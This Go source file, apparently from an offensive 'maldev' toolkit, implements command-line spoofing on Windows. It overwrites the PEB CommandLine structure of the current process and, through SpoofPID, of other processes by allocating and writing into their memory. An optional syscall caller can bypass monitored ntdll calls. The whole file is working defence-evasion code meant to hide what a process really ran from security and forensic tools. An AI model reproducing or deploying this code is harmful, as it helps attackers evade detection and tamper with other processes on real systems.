//go:build windows

package fakecmd

import (
	"fmt"
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// unicodeString mirrors the UNICODE_STRING structure.
// On x64: Length(2) + MaximumLength(2) + pad(4) + Buffer(8) = 16 bytes total.
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte
	Buffer        uintptr
}

// processBasicInformation mirrors PROCESS_BASIC_INFORMATION (x64: 48 bytes).
// PebBaseAddress is at offset +0x08.
type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

var (
	mu             sync.Mutex
	savedLength    uint16
	savedMaxLength uint16
	savedBuffer    uintptr
	// fakeBufferPins keeps UTF-16 slices alive so their backing memory is not
	// collected by the GC while the PEB still points at them.
	fakeBufferPins [][]uint16
)

// Spoof overwrites the current process PEB CommandLine UNICODE_STRING to point
// at fakeCmd. The first call saves the original values for Restore. Subsequent
// calls update the fake string without touching the saved originals.
//
// caller may be nil (falls back to direct ntdll via api.ProcNtQueryInformationProcess).
func Spoof(fakeCmd string, caller *wsyscall.Caller) error {
	mu.Lock()
	defer mu.Unlock()

	cmdLine, err := getCmdLinePtr(caller)
	if err != nil {
		return err
	}

	// Save originals only on the first call.
	if savedBuffer == 0 {
		savedLength = cmdLine.Length
		savedMaxLength = cmdLine.MaximumLength
		savedBuffer = cmdLine.Buffer
	}

	fakeW, err := windows.UTF16FromString(fakeCmd)
	if err != nil {
		return fmt.Errorf("encode fake command: %w", err)
	}
	// Pin the slice so GC cannot reclaim it while PEB points at it.
	// Replace rather than append — only the latest slice needs to stay alive.
	fakeBufferPins = [][]uint16{fakeW}

	newLen := uint16((len(fakeW) - 1) * 2) // byte length excluding NUL terminator
	cmdLine.Length = newLen
	cmdLine.MaximumLength = newLen + 2
	cmdLine.Buffer = uintptr(unsafe.Pointer(&fakeW[0]))
	return nil
}

// Restore writes the original PEB CommandLine values back. Safe to call
// multiple times; a no-op if Spoof was never called.
func Restore() error {
	mu.Lock()
	defer mu.Unlock()

	if savedBuffer == 0 {
		return nil
	}

	cmdLine, err := getCmdLinePtr(nil)
	if err != nil {
		return err
	}

	cmdLine.Length = savedLength
	cmdLine.MaximumLength = savedMaxLength
	cmdLine.Buffer = savedBuffer
	savedBuffer = 0
	fakeBufferPins = nil
	return nil
}

// Current returns the CommandLine string as currently recorded in the PEB.
func Current() string {
	mu.Lock()
	defer mu.Unlock()

	cmdLine, err := getCmdLinePtr(nil)
	if err != nil || cmdLine.Buffer == 0 || cmdLine.Length == 0 {
		return ""
	}
	nChars := int(cmdLine.Length / 2)
	buf := (*[1 << 20]uint16)(unsafe.Pointer(cmdLine.Buffer))[:nChars:nChars]
	return windows.UTF16ToString(buf)
}

// getCmdLinePtr resolves the UNICODE_STRING for CommandLine inside
// RTL_USER_PROCESS_PARAMETERS via the PEB.
//
// PEB offsets (x64):
//   +0x20  ProcessParameters  *RTL_USER_PROCESS_PARAMETERS
//
// RTL_USER_PROCESS_PARAMETERS offsets (x64):
//   +0x70  CommandLine        UNICODE_STRING
func getCmdLinePtr(caller *wsyscall.Caller) (*unicodeString, error) {
	var pbi processBasicInformation
	size := uint32(unsafe.Sizeof(pbi))
	var returnLen uint32
	const processBasicInformationClass = 0
	proc := windows.CurrentProcess()

	var status uintptr
	if caller != nil {
		var callErr error
		status, callErr = caller.Call("NtQueryInformationProcess",
			uintptr(proc),
			uintptr(processBasicInformationClass),
			uintptr(unsafe.Pointer(&pbi)),
			uintptr(size),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if status != 0 {
			return nil, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X: %w", uint32(status), callErr)
		}
	} else {
		var r uintptr
		r, _, _ = api.ProcNtQueryInformationProcess.Call(
			uintptr(proc),
			uintptr(processBasicInformationClass),
			uintptr(unsafe.Pointer(&pbi)),
			uintptr(size),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if r != 0 {
			return nil, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X", uint32(r))
		}
	}

	// Dereference PEB → ProcessParameters pointer.
	ppAddr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
	if ppAddr == 0 {
		return nil, fmt.Errorf("ProcessParameters pointer is nil")
	}

	return (*unicodeString)(unsafe.Pointer(ppAddr + 0x70)), nil
}

// SpoofPID overwrites the PEB CommandLine UNICODE_STRING of process pid.
// Requires PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
// PROCESS_QUERY_INFORMATION on the target. There is no corresponding Restore —
// call SpoofPID again with the original string if needed; the caller is
// responsible for tracking the original value.
//
// caller may be nil (falls back to ntdll via api.ProcNtQueryInformationProcess).
func SpoofPID(pid uint32, fakeCmd string, caller *wsyscall.Caller) error {
	const access = windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_QUERY_INFORMATION

	handle, err := windows.OpenProcess(access, false, pid)
	if err != nil {
		return fmt.Errorf("fakecmd: OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(handle)

	pbi, err := remoteProcessBasicInfo(handle, caller)
	if err != nil {
		return err
	}

	var ppAddr uintptr
	if err := readRemotePtr(handle, pbi.PebBaseAddress+0x20, &ppAddr); err != nil {
		return fmt.Errorf("fakecmd: read ProcessParameters ptr: %w", err)
	}

	fakeUTF16, err := windows.UTF16FromString(fakeCmd)
	if err != nil {
		return fmt.Errorf("fakecmd: UTF16FromString: %w", err)
	}
	byteLen := uintptr(len(fakeUTF16) * 2)

	var remoteAddr uintptr
	size := byteLen
	var allocStatus uintptr
	if caller != nil {
		allocStatus, _ = caller.Call("NtAllocateVirtualMemory",
			uintptr(handle),
			uintptr(unsafe.Pointer(&remoteAddr)),
			0,
			uintptr(unsafe.Pointer(&size)),
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
	} else {
		ntAlloc := api.Ntdll.NewProc("NtAllocateVirtualMemory")
		allocStatus, _, _ = ntAlloc.Call(
			uintptr(handle),
			uintptr(unsafe.Pointer(&remoteAddr)),
			0,
			uintptr(unsafe.Pointer(&size)),
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
	}
	if allocStatus != 0 {
		return fmt.Errorf("fakecmd: NtAllocateVirtualMemory in target: NTSTATUS 0x%X", uint32(allocStatus))
	}

	// Free the remote allocation if any step below fails — otherwise we leave
	// a PAGE_READWRITE buffer in the target that never gets wired into the PEB.
	success := false
	defer func() {
		if !success && remoteAddr != 0 {
			freeSize := uintptr(0)
			api.Ntdll.NewProc("NtFreeVirtualMemory").Call(
				uintptr(handle),
				uintptr(unsafe.Pointer(&remoteAddr)),
				uintptr(unsafe.Pointer(&freeSize)),
				uintptr(windows.MEM_RELEASE),
			)
		}
	}()

	fakeBytes := unsafe.Slice((*byte)(unsafe.Pointer(&fakeUTF16[0])), byteLen)
	if err := windows.WriteProcessMemory(handle, remoteAddr,
		&fakeBytes[0], byteLen, nil); err != nil {
		return fmt.Errorf("fakecmd: WriteProcessMemory (string): %w", err)
	}

	newLen := uint16((len(fakeUTF16) - 1) * 2)
	newMaxLen := uint16(len(fakeUTF16) * 2)
	cmdLineAddr := ppAddr + 0x70

	writeU16 := func(off uintptr, v uint16) error {
		return windows.WriteProcessMemory(handle, cmdLineAddr+off,
			(*byte)(unsafe.Pointer(&v)), 2, nil)
	}
	if err := writeU16(0, newLen); err != nil {
		return fmt.Errorf("fakecmd: patch Length: %w", err)
	}
	if err := writeU16(2, newMaxLen); err != nil {
		return fmt.Errorf("fakecmd: patch MaximumLength: %w", err)
	}
	if err := windows.WriteProcessMemory(handle, cmdLineAddr+8,
		(*byte)(unsafe.Pointer(&remoteAddr)), unsafe.Sizeof(remoteAddr), nil); err != nil {
		return fmt.Errorf("fakecmd: patch Buffer: %w", err)
	}

	success = true
	return nil
}

// remoteProcessBasicInfo fetches PROCESS_BASIC_INFORMATION for the given handle.
func remoteProcessBasicInfo(handle windows.Handle, caller *wsyscall.Caller) (processBasicInformation, error) {
	var pbi processBasicInformation
	size := uint32(unsafe.Sizeof(pbi))
	var returnLen uint32
	const processBasicInformationClass = 0

	var status uintptr
	if caller != nil {
		var callErr error
		status, callErr = caller.Call("NtQueryInformationProcess",
			uintptr(handle),
			uintptr(processBasicInformationClass),
			uintptr(unsafe.Pointer(&pbi)),
			uintptr(size),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if status != 0 {
			return pbi, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X: %w", uint32(status), callErr)
		}
	} else {
		r, _, _ := api.ProcNtQueryInformationProcess.Call(
			uintptr(handle),
			uintptr(processBasicInformationClass),
			uintptr(unsafe.Pointer(&pbi)),
			uintptr(size),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if r != 0 {
			return pbi, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X", uint32(r))
		}
	}
	return pbi, nil
}

// readRemotePtr reads a uintptr-sized value from addr in the remote process.
func readRemotePtr(proc windows.Handle, addr uintptr, out *uintptr) error {
	return windows.ReadProcessMemory(proc, addr,
		(*byte)(unsafe.Pointer(out)), unsafe.Sizeof(*out), nil)
}

// readRemoteStruct reads size bytes from addr in the remote process into dst.
func readRemoteStruct(proc windows.Handle, addr uintptr, dst unsafe.Pointer, size uintptr) error {
	return windows.ReadProcessMemory(proc, addr, (*byte)(dst), size, nil)
}
